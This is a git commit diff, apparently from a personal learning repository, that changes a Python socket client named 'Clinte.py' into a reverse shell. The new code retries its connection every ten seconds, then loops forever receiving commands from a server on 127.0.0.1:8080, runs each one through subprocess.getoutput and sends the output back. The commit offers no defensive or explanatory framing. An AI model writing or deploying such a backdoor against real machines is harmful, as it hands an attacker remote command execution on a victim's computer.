14375594942a149b1f6d5925e9654d375ec533d4
HackExit0x0 <99713919+hackexit0x0@users.noreply.github.com>
2024-11-27 21:23:39 +0530

    Update Clinte.py

--- projects/sockets/Clinte.py
+++ projects/sockets/Clinte.py
@@ -1,12 +1,33 @@
 #!/python3 
 
-# Cliente
+# Client.
 
 # import library *
 import socket
+import subprocess
+import time
 # connetion creation (use ipv4 and Tcp)
 Connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-# Servre ip and port (bind)
-Connection.connect(("127.0.0.1", 8080))
-# print message
-print("[+] Connected to server...")
+print("[+] trying to connect to server...")
+while True:
+    time.sleep(10)
+    try:
+        # Servre ip and port (bind)
+        Connection.connect(("127.0.0.1", 8080))
+        # connect to server
+        break
+    except ConnectionRefusedError:
+        print("[!] Connection failed, retrying...")
+        pass
+
+print("[+] Connecting to server...")
+# while loop rverse and send
+while True:
+    # Receive data from the server
+    RecvData = Connection.recv(1024).decode()
+    # output data
+    ClintOutput = subprocess.getoutput(RecvData)
+    # send data to server
+    Connection.send(ClintOutput.encode())
+
+# close connection
